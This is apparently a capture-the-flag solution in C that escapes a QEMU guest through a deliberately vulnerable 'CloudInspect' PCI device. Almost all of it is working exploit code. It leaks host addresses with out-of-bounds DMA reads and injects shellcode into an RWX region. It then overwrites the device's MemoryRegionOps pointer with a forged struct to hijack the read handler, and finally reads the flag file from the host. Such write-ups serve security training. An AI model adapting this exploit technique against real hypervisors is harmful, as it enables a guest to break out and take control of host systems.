#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>

unsigned char* iomem;
unsigned char* dmabuf;
uint64_t dmabuf_phys_addr;

#define PATH "/sys/devices/pci0000:00/0000:00:02.0/resource0"

/*
0000:00:00.0   0000:00:01.1   0000:00:02.0   firmware_node  power
0000:00:01.0   0000:00:01.3   QEMU0002:00    pci_bus        uevent
 */

#define DMA_SIZE        4096

#define CLOUDINSPECT_CRAZY_VALUE 0x0
#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98

#define CLOUDINSPECT_VENDORID 0x1337
#define CLOUDINSPECT_DEVICEID 0x1337
#define CLOUDINSPECT_REVISION 0xc1

#define CLOUDINSPECT_DMA_GET_VALUE      0x1
#define CLOUDINSPECT_DMA_PUT_VALUE      0x2

#define OFFSET_DMABUF 0xf3cdb8

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

/*
mov     rax, 2
push    0x67616c66
mov     rdi, rsp
mov     rsi, 0
mov     rdx, 0x1fd
syscall 
mov     rdi, rax
xor     rax, rax
lea     rsi, [rip]
and     rsi, 0xffffffffff000000
add     rsi, 0x5000
mov     rdx, 0x30
syscall 
add     rsp, 8
ret     
*/

// thx shellstorm and keystone lmao

#define CODE "\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3"

enum device_endian {
    DEVICE_NATIVE_ENDIAN,
    DEVICE_BIG_ENDIAN,
    DEVICE_LITTLE_ENDIAN,
};

struct MemoryRegionOps {
    /* Read from the memory region. @addr is relative to @mr; @size is
     * in bytes. */
    uint64_t read; 
    /* Write to the memory region. @addr is relative to @mr; @size is
     * in bytes. */
    void (*write)(void *opaque,
                  uint64_t addr,
                  uint64_t data,
                  unsigned size);

    size_t (*read_with_attrs)(void *opaque,
                                   uint64_t addr,
                                   uint64_t *data,
                                   unsigned size,
                                   size_t attrs);
    size_t (*write_with_attrs)(void *opaque,
                                    uint64_t addr,
                                    uint64_t data,
                                    unsigned size,
                                    size_t attrs);

    enum device_endian endianness;
    /* Guest-visible constraints: */
    struct {
        /* If nonzero, specify bounds on access sizes beyond which a machine
         * check is thrown.
         */
        unsigned min_access_size;
        unsigned max_access_size;
        /* If true, unaligned accesses are supported.  Otherwise unaligned
         * accesses throw machine checks.
         */
         bool unaligned;
        /*
         * If present, and returns #false, the transaction is not accepted
         * by the device (and results in machine dependent behaviour such
         * as a machine check exception).
         */
        bool (*accepts)(void *opaque, uint64_t addr,
                        unsigned size, bool is_write,
                        size_t attrs);
    } valid;
    /* Internal implementation constraints: */
    struct {
        /* If nonzero, specifies the minimum size implemented.  Smaller sizes
         * will be rounded upwards and a partial result will be returned.
         */
        unsigned min_access_size;
        /* If nonzero, specifies the maximum size implemented.  Larger sizes
         * will be done as a series of accesses with smaller sizes.
         */
        unsigned max_access_size;
        /* If true, unaligned accesses are supported.  Otherwise all accesses
         * are converted to (possibly multiple) naturally aligned accesses.
         */
        bool unaligned;
    } impl;
};

int fd;

uint64_t virt2phys(void* p)
{
   uint64_t virt = (uint64_t)p;
   assert((virt & 0xfff) == 0);
   int fd = open("/proc/self/pagemap", O_RDONLY);
   if (fd == -1)
      perror("open");
   uint64_t offset = (virt / 0x1000) * 8;
   lseek(fd, offset, SEEK_SET);
	    
   uint64_t phys;
   if (read(fd, &phys, 8 ) != 8)
      perror("read");
	     
   assert(phys & (1ULL << 63));
   phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
   return phys;
}

void iowrite(uint64_t addr, uint64_t value)
{
	    *((uint64_t*)(iomem + addr)) = value;
}
 
uint64_t ioread(uint64_t addr)
{
	    return *((uint64_t*)(iomem + addr));
}

uint64_t write_dmabuf(uint64_t offt, uint64_t value) {
	*(uint64_t* )dmabuf = value;
        iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, offt);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 8);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);

	
	iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, 0x300);
	
	return 0;
}

uint64_t read_offt(uint64_t offt) {
	iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, offt);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 8);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);

	ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER);

	return *(uint64_t* )dmabuf;
}

int main() {
	int fd1 = open(PATH, O_RDWR | O_SYNC);
	if (-1 == fd1) {
		fprintf(stderr, "Cannot open %s\n", PATH);
		return -1;
	} // open resource0 to interact with the device

	iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, 0); // map resource0
	printf("iomem @ %p\n", iomem);

	dmabuf = malloc(0x1000);
	memset(dmabuf, '\x00', sizeof(dmabuf));

	if (MAP_FAILED == iomem) {
		return -1;
	}

	mlock(dmabuf, 0x1000); // trigger PAGE_FAULT to acually map the page
	dmabuf_phys_addr = virt2phys(dmabuf); // grab the physical address according to pagemap
        printf("DMA buffer (virt) @ %p\n", dmabuf);
	printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);

	// offset I got in gdb locally
	uint64_t base = read_offt(0x10c0 + 8*3) - 0xdef90;
	uint64_t bss = base + 0xbc2000;
	uint64_t heap_base = read_offt(0x1000 + 8*3) - 0xf3bff0; // useless
	uint64_t ops_struct = read_offt(-0xd0); // That's &ClouInspctState.mmio.ops
	uint64_t addr_obj = read_offt(-(0xd0-8)) + 2568; // CloudInspectState.mmio.opaque
	uint64_t leak_rwx = read_offt((bss + 0x6000) - addr_obj) & ~0xffff; // leak in the bss

	printf("[*] ops_struct: %lx\n", ops_struct);
	printf("[*] Binary base address: %lx\n", base);
	printf("[*] Heap base address: %lx\n", heap_base);
	printf("[*] Leak rwx: %lx\n", leak_rwx);
	printf("[*] Addr obj: %lx\n", addr_obj);
	
	// We write the shellcode

	memcpy(dmabuf, CODE, 130);

	printf("[*] Writing the shellcode @ %lx\n", leak_rwx + 0x1000);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, leak_rwx - addr_obj + 0x1000);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 130);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);

	iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, 0x300);
	
	
	// Craft fake MemoryRegionOps structure by reading the original one
	struct MemoryRegionOps fake_ops = {0};
	
	printf("[*] reading struct mmio.MemoryRegionOps @ %lx\n", ops_struct);

	iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, -(addr_obj - ops_struct));
        iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, sizeof(struct MemoryRegionOps));
        iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);
	ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER);

	// Write it in the fake struct
	memcpy(&fake_ops, dmabuf, sizeof(struct MemoryRegionOps));

	fake_ops.read = (leak_rwx + 0x1000); // Edit the handler we want to hook
	printf("[*] fake_ops.read = %lx\n", leak_rwx + 0x1000);
	memcpy(dmabuf, &fake_ops, sizeof(struct MemoryRegionOps));
	// patch it and write it @ leak_rwx + 0x2000

	iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, leak_rwx - addr_obj + 0x2000);
        iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, sizeof(struct MemoryRegionOps));
        iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, dmabuf_phys_addr);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_TRIGGER, 0x300);

	printf("[*] CloudInspectState.mmio.ops = &fake_ops [%lx]\n", leak_rwx+0x2000);
	write_dmabuf(-0xd0, leak_rwx+0x2000);
	// Set the pointer to the MemoryRegionOps to our fake MemoryRegionOps

	ioread(0x37); // trigger the read handler we control, then the shellcode is executed and the flag is written @ leak_rwx + 0x5000
	printf("[*] CloudInspectState.mmio.ops.read () => jmp @ %lx\n", leak_rwx + 0x1000);

	char flag[0x30] = {0};

	// So we just have to read the flag @ leak_rwx + 0x5000

	write_dmabuf(-0xd0, ops_struct);
	printf("[*] CloudInspectState.mmio.ops = original ops\n");

	printf("[*] Reading the flag @ %lx\n", leak_rwx + 0x5000);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_CMD, CLOUDINSPECT_DMA_PUT_VALUE);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_SRC, leak_rwx - addr_obj + 0x5000);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_CNT, 0x30);
	iowrite(CLOUDINSPECT_MMIO_OFFSET_DST, dmabuf_phys_addr);

	if (!ioread(CLOUDINSPECT_MMIO_OFFSET_TRIGGER)) {
		perror("Failed to read the flag\n");
		return -1;
	}

	memcpy(flag, dmabuf, 0x30);
	printf("flag: %s\n", flag);
	
	sleep(20);

	return 0;
}

// flag{cloudinspect_inspects_your_cloud_0107}
